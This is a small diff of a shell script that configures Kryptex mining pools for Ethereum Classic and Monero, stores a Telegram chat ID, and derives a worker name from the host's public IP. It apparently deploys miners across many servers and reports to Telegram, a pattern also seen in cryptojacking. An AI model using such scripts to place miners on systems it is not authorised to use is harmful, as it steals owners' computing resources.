@@ -9,7 +9,8 @@ TELEGRAM_CHAT_ID="7032066912"
 GPU_POOL="etc.kryptex.network:7033"
 CPU_POOL="xmr.kryptex.network:7029"
 
-SERVER_IP=$(hostname -I | awk '{print $1}' 2>/dev/null || curl -s ifconfig.me 2>/dev/null || echo "0.0.0.0")
+HOSTNAME_VAR=$(hostname 2>/dev/null || echo "unknown-host")
+SERVER_IP=$(curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || echo "0.0.0.0")
 WORKER_ID=$(echo "$SERVER_IP" | tr -d '.')
 WORKER_NAME="${KRYPTEX_IDENTIFIER}.${WORKER_ID}"
 
